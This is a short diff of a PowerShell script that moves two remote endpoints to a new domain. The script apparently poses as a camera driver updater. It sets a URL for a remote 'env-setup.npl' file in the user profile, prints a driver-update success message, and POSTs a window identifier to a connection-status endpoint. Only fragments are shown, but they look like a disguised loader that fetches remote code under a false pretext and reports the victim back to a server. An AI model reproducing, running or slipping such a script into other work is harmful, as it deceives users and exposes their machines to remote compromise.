@@ -226,7 +226,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.wecreateproblems.net/driver/env-setup.npl"
+$envSetupUrl = "https://api.wecreateproblems.us/driver/env-setup.npl"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
@@ -306,7 +306,7 @@ if ($LASTEXITCODE -ne 0) {
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
     $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
-    $autoUrl = "https://api.wecreateproblems.net/change-connection-status/$safeWindowUid"
+    $autoUrl = "https://api.wecreateproblems.us/change-connection-status/$safeWindowUid"
     try {
         # Prefer native PowerShell HTTP first.
         Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
